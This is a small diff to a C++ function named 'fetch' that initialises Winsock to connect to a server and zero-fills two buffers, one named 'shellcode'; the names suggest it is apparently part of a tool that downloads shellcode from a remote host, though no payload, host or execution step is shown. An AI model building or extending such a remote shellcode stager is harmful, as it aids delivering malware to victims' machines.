@@ -23,9 +23,9 @@ void fetch(string server, string path) {
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
-	char buf[8192];
+	char buf[8192]={0};
 	string response;
-	unsigned char shellcode[8192];
+	unsigned char shellcode[8192]={0};
 
 	// initialize winsock, create socket and connect to server
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
